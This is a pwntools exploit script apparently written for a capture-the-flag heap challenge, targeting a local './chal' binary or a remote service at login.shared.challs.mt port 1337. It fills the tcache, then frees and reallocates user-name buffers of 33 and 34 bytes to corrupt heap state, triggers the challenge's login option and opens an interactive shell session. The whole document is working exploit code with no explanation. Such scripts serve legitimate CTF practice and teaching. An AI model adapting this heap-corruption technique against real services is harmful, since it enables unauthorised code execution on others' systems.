from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("login.shared.challs.mt",1337)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def create(idx, name):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Enter user index.\n>", str(idx))
    io.sendafter("Enter user name.\n> ", str(name))

def delete(idx):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Enter user index.\n>", str(idx))

def select(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Enter user index.\n>", str(idx))

def login():
    io.sendlineafter("> ", "5")

for i in range(7):
    create(i, "a")

for i in range(7):
    delete(i)

create(0, "a")
create(1, "a")
create(2, "a")
delete(0)
create(0, "t"*34)
delete(0)
ddebug("breakrva 0x001525\ncontinue")
create(0, "t"*33)


select(1)
login()

io.interactive()
